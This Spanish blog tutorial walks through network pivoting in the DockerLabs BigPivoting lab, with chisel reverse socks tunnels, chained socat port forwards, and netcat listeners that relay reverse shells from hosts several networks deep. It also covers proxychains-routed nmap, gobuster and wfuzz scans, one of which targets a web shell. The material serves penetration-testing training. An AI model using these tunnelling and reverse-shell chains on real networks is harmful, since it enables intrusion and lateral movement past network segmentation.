---
title: Pivoting con Chisel
description: Pivotar con chisel puede ser abrumador al principio, pero después de leer este artículo, será pan comido.
date: 2024-10-31
categories: [pivoting]
tags: [pivoting, chisel, socat, linux, redirecciones, tunel, redes]
img_path: /assets/img/pivoting-chisel.png
image: /assets/img/pivoting-chisel.png
---

## **Introducción**

En un entorno real, las redes de la empresa **están segmentadas**, es decir, hay diferentes redes para diferentes lugares. Es por ello, que cuando estamos realizando una auditoría, debemos de tener los **conceptos de pivoting** bien claros, ya que sin ellos, no podremos abarcar todo el rango de activos de la empresa.

Este artículo, tiene como finalidad, enseñar como **pivotar en la red**, haciendo uso de `chisel` y `socat`. El laboratorio que vamos a usar para practicar es [BigPivoting de DockerLabs](https://dockerlabs.es/) el cual, nos monta un total de 5 máquinas en diferentes interfaces, usando `docker`.

Además, te servirá como ayuda para presentarte a exámenes como el **eCPPT** y **OSCP**.

## **Puesta en escena**

El escenario que vamos a abarcar es el siguiente.

![Esquema de Red BigPivoting Dockerlabs](/assets/img/esquema-de-red-bigpivoting-dockerlabs.png)

A continuación, se explica el esquema de red anterior:

- **Red inicial del atacante** ➜ Nosotros como atacantes, perteneceremos a la red **10.10.10.1** con la que tendremos conectividad con la máquina **10.10.10.2**, pero no con ninguna otra red. 
- **Segunda red** ➜ La máquina **10.10.10.2** contará con otra interfaz de red, cuya IP es la **20.20.20.2**. Esta **20.20.20.2** tendrá conectividad con la máquina **20.20.20.3**.
- **Tercera red** ➜ Esta máquina **20.20.20.3**, tendrá otra interfaz **30.30.30.2**, cuya conectividad cuenta con la **30.30.30.3**.
- **Cuarta Red** ➜ La **30.30.30.3**, tiene otra interfaz **40.40.40.2**. En la red de la máquina **40.40.40.2** estará la **40.40.40.3** que a su vez, esta tendrá la **50.50.50.2**.
- **Quinta red** ➜ Finalmente, la máquina **50.50.50.2** tendrá conectividad con la **50.50.50.3**.

Esto quiere decir que, nosotros como atacantes solamente tenemos acceso a la **10.10.10.2** y tenemos que intentar llegar a vulnerar y a mandarnos una *reverse shell* desde la **50.50.50.3** hasta nuestra IP **10.10.10.1**. Conseguiremos efectuar todo esto, gracias a herramientas como `chisel` y `socat` que nos permitirá realizar **pivoting** para lograr tener acceso a todas las interfaces de red que se ven en el esquema.

## **Manos a la obra**

### **Conectando la 10.10.10.0/24 ➜ 20.20.20.0/24**

Una vez que hayamos vulnerado la máquina **10.10.10.2**, desde la cual teníamos conectividad con nuestra máquina de atacantes **10.10.10.1** tendremos que crear nuestro servidor `chisel`. Para ello, desde nuestra máquina de atacantes **10.10.10.1**, crearemos el servidor.

```bash
./chisel server --reverse -p 1234
```

Seguidamente, desde la primera máquina víctima **10.10.10.2**, nos conectaremos a nuestro servidor `chisel` y nos traeremos todos los puertos.

```bash
./chisel client 10.10.10.1:1234 R:socks
```

Tal y como se puede ver en la siguiente imagen, hemos abierto un túnel por el puerto *1080*.

![Servidor chisel conectando la 10 con la 20.png](/assets/img/servidor-chisel-conectando-la-10-con-la-20.png)

Ahora, deberemos de editar como *root* el fichero `/etc/proxychains4.conf`, para configurar que `proxychains` vaya por el túnel *socks5://127.0.0.1:1080*. Meteremos la siguiente línea abajo del todo.

```bash
socks5  127.0.0.1 1080
```

![Proxy personalizado proxychains 1080.png](/assets/img/proxy-personalizado-proxychains-1080.png)

También, deberemos de chequear que está comentada la línea de *dynamic_chain* y descomentada la de *strict_chain*.

![Strict chain descomentado y dynamic chain comentado.png](/assets/img/strict-chain-descomentado-y-dynamic-chain-comentado.png)

De esta manera, usando el comando `proxychains` delante de los demás comandos (menos en algunos que deberemos de poner el parámetro `-p` o `--proxies` como `gobuster`) lograremos tener acceso a toda la red **20.20.20.0/24** desde nuestra máquina **10.10.10.1**. La siguiente imagen, es un esquema que demuestra de forma gráfica lo que hemos realizado.

![Conectando la 10.10.10.0/24 con la 20.20.20.024.png](/assets/img/conectando-la-10.10.10.024-con-la-20.20.20.024.png)

### **Conectando la 10.10.10.0/24 ➜ 30.30.30.0/24**

Supongamos que hemos vulnerado ya la máquina **20.20.20.3**, y hemos visto que tiene otra interfaz **30.30.30.2**. Para conectar la red **10.10.10.0/24** con la **30.30.30.0/24**, con el fin de tener conectividad entre ellas, tendremos que traernos `chisel` a la máquina **30.30.30.2**, que en realidad también es la **20.20.20.3**.

Una vez que tengamos `chisel` en la **30.30.30.2** y `socat` en la **20.20.20.2**, crearemos el túnel `socat` para redirigir todo lo que nos llegue por el puerto *1111*, al puerto en el cual tenemos montado el servidor `chisel`.

```bash
./socat TCP-LISTEN:1111,fork TCP:10.10.10.1:1234
```

A continuación, nos deberemos de conectar con `chisel` desde la **20.20.20.3** a la **20.20.20.2** por el puerto *1111*. De esta manera, cuando llegue la conexión a la **20.20.20.2** por el puerto *1111*, redirigirá las conexiones a nuestro túnel `chisel`. Además, deberemos de configurar el puerto que se nos va a abrir en el túnel. En este caso, hemos puesto el puerto *2221*.

```bash
./chisel client 20.20.20.2:1111 R:2221:socks
```

Podemos ver cómo nos hemos conectado exitosamente.

![Chisel conectándose a la 10 y socat a nuestro server chisel.png](/assets/img/chisel-conectandose-a-la-10-y-socat-a-nuestro-server-chisel.png)

Si ahora nos vamos al servidor `chisel`, veremos cómo hemos abierto un nuevo túnel por el puerto *2221*, que es el que hemos especificado con anterioridad.

![Túnel por el puerto 2221 que conecta con la 30.png](/assets/img/tunel-por-el-puerto-2221-que-conecta-con-la-30.png)

Como hicimos anteriormente, deberemos de configurar `/etc/proxychains4.conf` para poder obtener acceso cuando usemos el comando `proxychains`. Cada nuevo túnel que creemos, deberemos de definirlo encima del anterior.

```bash
socks5  127.0.0.1 2221
```

![Socks5 proxychains por el 2221.png](/assets/img/socks5-proxychains-por-el-2221.png)

Y esta vez, tenemos que comentar *strict_chain* para descomentar *dynamic_chain*, ya que ahora tenemos más de un túnel configurado.

![Dynamic chain descomentado y strict chain comentado.png](/assets/img/dynamic-chain-descomentado-y-strict-chain-comentado.png)

La siguiente imagen, es un esquema que resume lo que hemos hecho, pero de forma gráfica.

![Conectando la 10.10.10.024 con la 30.30.30.024.png](/assets/img/conectando-la-10.10.10.024-con-la-30.30.30.024.png)

### **Conectando la 10.10.10.0/24 ➜ 40.40.40.0/24**

A continuación, conseguimos vulnerar la máquina **30.30.30.3**. Vemos que esta máquina, tiene otra interfaz por la cual tiene conectividad con la **40.40.40.2** y, para poder atacarla, deberemos de tener conectividad con esta. Lo que vamos a realizar a continuación es, conectarnos desde la **30.30.30.3** a nuestra máquina **10.10.10.1**, y para ello, deberemos de conectarnos a nuestro nodo más cercano desde la **30.30.30.3**.

El nodo más cercano de la **30.30.30.3** es la **30.30.30.2**. Con `chisel` nos conectaremos a la **30.30.30.2** como clientes, por el puerto *3333*, y especificaremos como puerto que se nos abrirá en nuestro servidor `chisel`, el *3331*. Seguidamente, desde la máquina **20.20.20.3** (también es la **30.30.30.2**), redirigiremos todas las conexiones que lleguen a nuestro puerto *3333*, al puerto *3332* de la máquina **20.20.20.2**. Por último, desde la máquina **10.10.10.2** (también es la **20.20.20.2**), redirigiremos todas las conexiones que lleguen al puerto *3332* a nuestro puerto *1234*, desde el cual estamos escuchando en nuestro servidor `chisel`.

Vamos a verlo de forma práctica. Como primera instancia, nos abriremos una consola en la máquina **10.10.10.2** desde la cual, ejecutaremos el siguiente comando que redirigirá todas sus conexiones al puerto *3332*, hacia nuestro puerto *1234*, que es donde reside nuestro servidor `chisel`.

```bash
./socat TCP-LISTEN:3332,fork TCP:10.10.10.1:1234
```

A continuación, nos abriremos otra consola en la máquina **20.20.20.3** desde la cual, estaremos redirigiendo todas las conexiones hacia el puerto *3331* al puerto *3332* de la máquina **20.20.20.2**.

```bash
./socat TCP-LISTEN:3333,fork TCP:20.20.20.2:3332
```

Y por último, desde la consola en la máquina **30.30.30.3**, nos conectaremos con `chisel` a la máquina **30.30.30.2** por el puerto *3333*.

```bash
./chisel client 30.30.30.2:3333 R:3331:socks
```

Como podemos ver, nos hemos conseguido conectar a nuestro servidor `chisel`.

![Conectando la 40.40.40.0 con la 10.10.10.0.png](/assets/img/conectando-la-40.40.40.0-con-la-10.10.10.0.png)

Si nos vamos a nuestro servidor `chisel`, veremos el puerto que se ha abierto, el cual hemos especificado cuando nos conectamos como clientes en la máquina **30.30.30.3**.

![Conexión tunel puerto 3331 de la 30.30.30.0 que conecta con la 40.40.40.0.png](/assets/img/conexion-tunel-puerto-3331-de-la-30.30.30.0-que-conecta-con-la-40.40.40.0.png)

Lo último que nos queda es, configurar el fichero `/etc/proxychains4.conf` con la siguiente línea. Recordamos que hay que introducirla encima de todas las demás anteriores.

```bash
socks5  127.0.0.1 3331
```

![Socks5 a la 30.30.30.0 puerto 3331.png](/assets/img/socks5-a-la-30.30.30.0-puerto-3331.png)

Con toda esta configuración, tendremos acceso a la red **40.40.40.0** desde nuestra máquina **10.10.10.0**, utilizando `proxychains`.

### **Enviándonos una Reverse Shell desde la 40.40.40.3 ➜ 10.10.10.1**

La vulnerabilidad que posee la máquina **40.40.40.3** es de tipo **RCE**, por lo que para conseguir acceso a dicha máquina, tenemos que enviarnos una *reverse shell* desde la **40.40.40.3** a nuestra máquina **10.10.10.1**. Para conseguir esto, deberemos de redirigir las conexiones con `socat` para que la *reverse shell* consiga llevar a nuestro puerto *1337* por el que estaremos en escucha.

Primeramente, nos pondremos en escucha en nuestra máquina **10.10.10.1** por el puerto comentado anteriormente.

```bash
nc -nlvp 1337
```

Seguidamente, accedemos de nuevo a la máquina **30.30.30.3** (también es la **40.40.40.2**), y redirigiremos todas las conexiones de esta máquina al puerto *443*, hacia el puerto *4443* de la máquina **30.30.30.2**.

```bash
./socat TCP-LISTEN:443,fork TCP:30.30.30.2:4443
```

A continuación, desde la **20.20.20.3** (que también es la **30.30.30.2**), redirigiremos todas las conexiones al puerto *4443*, hacia el puerto *4442* de la **20.20.20.2**.

```bash
./socat TCP-LISTEN:4443,fork TCP:20.20.20.2:4442
```

Finalmente, desde la **10.10.10.2** (también es la **20.20.20.2**), redirigiremos todas las conexiones al puerto *4442*, hacia el puerto *1337* de nuestra máquina (**10.10.10.1**) desde la cual estamos en escucha con `nc`.

```bash
./socat TCP-LISTEN:4442,fork TCP:10.10.10.1:1337
```

Podemos ver el flujo de conexiones en la siguiente imagen.

![Flujo de conexiones socat para una reverse shell desde la 40.40.40.3 a la 10.10.10.1.png](/assets/img/flujo-de-conexiones-socat-para-una-reverse-shell-desde-la-40.40.40.3-a-la-10.10.10.1.png)

Una vez todo configurado, enviaremos la *reverse shell* al **nodo más cercano**, que es la **40.40.40.2** por su puerto *443*.

![Enviando la reverse shell desde el rce en la 40.40.40.3.png](/assets/img/enviando-la-reverse-shell-desde-el-rce-en-la-40.40.40.3.png)

Una vez que lo ejecutemos, veremos cómo viaja la conexión hasta nuestra máquina **10.10.10.1** por nuestro puerto *1337*, y conseguimos acceso a la **40.40.40.3**.

![Conexión desde la 40.40.40.3 a la 10.10.10.1 conseguida.png](/assets/img/conexion-desde-la-40.40.40.3-a-la-10.10.10.1-conseguida.png)

### **Conectando la 10.10.10.0/24 ➜ 50.50.50.0/24**

Ahora que tenemos acceso a la máquina **40.40.40.3**, deberemos de montar nuestro túnel con el fin de conseguir acceso a la **50.50.50.0**, que es la segunda interfaz que tiene esta máquina. Como primera acción, nos meteremos en la **40.40.40.2** (que también es la **30.30.30.3**), y redirigiremos las conexiones al puerto *5554* hacia el puerto *5553* de la **30.30.30.2**.

```bash
./socat TCP-LISTEN:5554,fork TCP:30.30.30.2:5553
```

De la misma forma, desde la **30.30.30.2** (también es la **20.20.20.3**), redirigiremos el tráfico al puerto *5553* al puerto *5551* de la **20.20.20.2**.

```bash
./socat TCP-LISTEN:5553,fork TCP:20.20.20.2:5551
```

A continuación, desde la **20.20.20.2** (que también es la **10.10.10.2**), redirigiremos las conexiones al puerto *5551*, a nuestro servidor `chisel` de nuestra máquina **10.10.10.1**.

```bash
./socat TCP-LISTEN:5551,fork TCP:10.10.10.1:1234
```

De esta manera, lograremos tener un puente para que nosotros, desde la **40.40.40.3**, conectarnos a la máquina **40.40.40.2** por el puerto *5554*. Además, configuraremos que el puerto que se nos abrirá en nuestro servidor `chisel` será el *5551*.

```bash
./chisel client 40.40.40.2:5554 R:5551:socks
```

Podemos ver que nos hemos conseguido conectar exitosamente desde la **40.40.40.4** a nuestra máquina **10.10.10.1**.

![Flujo de conexiones con socat para obtener acceso a la 50.50.50.0.png](/assets/img/flujo-de-conexiones-con-socat-para-obtener-acceso-a-la-50.50.50.0.png)

Si nos vamos a nuestro servidor `chisel`, efectivamente, el puerto que se nos ha abierto es el especificado.

![Conexión con la 50.50.50.0.png](/assets/img/conexion-con-la-50.50.50.0.png)

No podemos olvidarnos de, una vez configurado todo, añadir la línea de conexión que identifique el nuevo túnel en el servidor `chisel` para poder usar `proxychains`.

![Proxychains puerto 5551.png](/assets/img/proxychains-puerto-5551.png)

### **Enviándonos una Reverse Shell desde la 50.50.50.3 ➜ 10.10.10.1**

Para enviarnos una *reverse shell* desde la **50.50.50.3** hasta nuestra **10.10.10.1**, tenemos que hacer la misma operatoria que hemos estado viendo hasta ahora. Sin embargo, en vez de volver a crear el flujo de redirecciones de puertos con `socat`, como hicimos cuando nos enviamos una *reverse shell* desde la **40.40.40.3** a nuestra máquina **10.10.10.1**, nos aprovecharemos de estos túneles para, simplemente, redirigir el puerto con el que iniciaremos la *reverse shell*.

Para entender eso, vamos a hacerlo de forma práctica. Partimos del siguiente flujo de redirecciones.

![Flujo de redirecciones desde la 40.40.40.2 hasta la 10.10.10.1.png](/assets/img/flujo-de-redirecciones-desde-la-40.40.40.2-hasta-la-10.10.10.1.png)

En esta imagen, lo que podemos apreciar es lo siguiente:

1. Las conexiones que entren a la máquina **40.40.40.2** por su puerto *443*, las redirigirá al puerto *4443* de la máquina **30.30.30.2** (que a su vez es la **20.20.20.3**).
2. Estas conexiones que le entran a la máquina **30.30.30.2** (que también es la **20.20.20.3**) al puerto *4443*, las reenviará al puerto *4442* de la **20.20.20.2** (también es la **10.10.10.2**).
3. Por último, el tráfico que entre a la **20.20.20.2** (que también es la **10.10.10.2**) al puerto *4442*, las reenviará a nuestra máquina **10.10.10.1** por nuestro puerto *1337*.

Teniendo esto claro, aprovecharemos todo este flujo para, crear una simple redirección desde la **50.50.50.2** (que también es la **40.40.40.3**). De forma que, reenviaremos las conexiones entrantes al puerto *555*, hacia la **40.40.40.2** por su puerto *443*, en el que ya está redirigiendo todo el flujo que hemos explicado anteriormente y que llegará finalmente al puerto *1337* de nuestra máquina **10.10.10.1**.

```bash
./socat TCP-LISTEN:555,fork TCP:40.40.40.2:443
```

Además, tenemos que ponernos en escucha por el puerto en el que finalmente llegará la conexión.

```bash
nc -nlvp 1337
```

Todo esto que acabamos de comentar, debería de quedar de la siguiente imagen.

![Túnel de la 50.50.50.2 a la 40.40.40.2 para seguir el flujo anterior de redireccinoes.png](/assets/img/tunel-de-la-50.50.50.2-a-la-40.40.40.2-para-seguir-el-flujo-anterior-de-redireccinoes.png)

Seguidamente, enviaremos la *reverse shell* al nodo más cercano que, en este caso, es la **50.50.50.2**, y deberemos de introducir el puerto desde el cual nos hemos puesto en escucha con `socat`.

![Reverse shell desde la 50.50.50.2 a la 10.10.10.1 siguiendo el flujo de conexiones.png](/assets/img/reverse-shell-desde-la-50.50.50.2-a-la-10.10.10.1-siguiendo-el-flujo-de-conexiones.png)

Una vez ejecutado la *reverse shell*, recibiremos la consola interactiva de la **50.50.50.3**, hacia donde estábamos con `nc` en escucha

![Reverse shell recibida desde la 50.50.50.3.png](/assets/img/reverse-shell-recibida-desde-la-50.50.50.3.png)

Finalmente, una vez que consigamos acceso como *root* a esta máquina, habremos logrado el laboratorio completo.

## **Usando herramientas con túneles proxy**

Cuando necesitamos pivotar y crear túneles con `chisel`, algunas de las herramientas para que funcionen correctamente, es necesario añadirle parámetros como `--proxy`, `--proxies`, `-p` y otros más. Es por ello, que necesitamos saber estos parámetros y como usar estas herramientas para hacer pasar las conexiones por el túnel correcto. A continuación, se mostrarán un par de las herramientas más usadas a la hora de hacer un pentest una máquina.

### **La mayoría de las herramientas**

La mayoría de las herramientas, para que pase por el túnel `chisel` es necesario usar `proxychains`. Un ejemplo de cómo se usa es el siguiente:

```bash
proxychains ssh hegociv@10.10.10.1
```

Antes de cada comando, deberemos de poner el comando `proxychains`, seguido del resto. Con esto, lograremos hacer pasar las conexiones por el túnel `chisel` en la mayoría de las herramientas.

### **Nmap**

Con la herramienta `nmap` también debemos de usar `proxychains` antes del comando, sin embargo, debemos de tener algunas consideraciones. Hay algunos parámetros de este comando que no funcionan cuando pasan por un túnel `chisel`. Para realizar un escaneo correcto con `nmap`, podemos usar el siguiente comando.

```bash
proxychains nmap -p- --open --min-rate 5000 -sCV -Pn -sCV -sT -n -vvv 10.10.10.1 -oN targeted
```

Podemos ver, que en vez de usar el parámetro `-sS` hemos usado `-sT`. Esto es, porque el *TCP SYN Scan* no funciona a través de `chisel` y tenemos que realizar un escaneo *TCP Connect Scan*. Al igual de que **ES OBLIGATORIO** usar el parámetro `-Pn` para que no compruebe si el host está activo, ya que de lo contrario finalizará el escaneo al no detectar que el host está activo.

### **Gobuster**

La herramienta de `gobuster` tiene el parámetro `--proxy` que debemos de usar, en el que le especificaremos el *proxy* correspondiente por el que tiene que pasar.

```bash
gobuster dir -u "http://50.50.50.3/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt --proxy socks5://127.0.0.1:5551
```

De esta manera, le estaremos diciendo a `gobuster`, que el *proxy* por el que tiene que pasar se encuentra en nuestro equipo local (*127.0.0.1*), por el puerto *5551*, y que es de tipo *socks5*.

### **Wfuzz**

La herramienta `wfuzz` le pasa lo mismo que a `gobuster`. Tiene el parámetro `-p`, en el que le indicaremos cual es el *proxy* por el cual tiene que pasar. En este caso, la sintaxis en un poco diferente.

```bash
wfuzz -c -t 200 --hw=0 -u "http://50.50.50.3/shell.php?FUZZ=whoami" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -p 127.0.0.1:5551:SOCKS5
```

Con esto, le estaremos especificando exactamente lo mismo que con `gobuster`, pero con una sintaxis que entiende la propia herramienta `wfuzz`.

## **Despedida**

Espero que este blog te sirva para tener un conocimiento mayor de cómo **pivotar entre diferentes redes** y conseguir acceder a redes desde las cuales, no teníamos acceso inicialmente.
